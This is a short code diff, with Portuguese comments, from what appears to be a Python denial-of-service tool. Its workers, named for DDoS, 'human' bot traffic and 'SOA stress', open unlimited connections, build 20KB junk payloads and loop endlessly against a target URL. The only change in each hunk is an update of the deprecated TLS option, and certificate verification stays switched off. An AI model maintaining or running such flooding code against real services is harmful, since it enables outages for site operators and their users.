@@ -40,7 +40,7 @@ async def worker_ddos(worker_id, target_url):
     print(f"[DDoS {worker_id}] Iniciado para {target_url}")
     payload = b"X" * 20480 # 20KB de lixo
     timeout = aiohttp.ClientTimeout(total=2)
-    conn = aiohttp.TCPConnector(limit=0, verify_ssl=False)
+    conn = aiohttp.TCPConnector(limit=0, ssl=False)
     
     async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
         while True:
@@ -54,7 +54,7 @@ async def worker_human(worker_id, target_url, bot_type, pool):
     print(f"[Human {worker_id}] Iniciado. Tipo: {bot_type}")
     
     timeout = aiohttp.ClientTimeout(total=10)
-    conn = aiohttp.TCPConnector(verify_ssl=False)
+    conn = aiohttp.TCPConnector(ssl=False)
     
     async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
         while True:
@@ -119,7 +119,7 @@ async def worker_human(worker_id, target_url, bot_type, pool):
 async def worker_soa(worker_id, target_url):
     print(f"[SOA Stress {worker_id}] Iniciado para {target_url}")
     timeout = aiohttp.ClientTimeout(total=5)
-    conn = aiohttp.TCPConnector(verify_ssl=False)
+    conn = aiohttp.TCPConnector(ssl=False)
     
     async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
         while True:
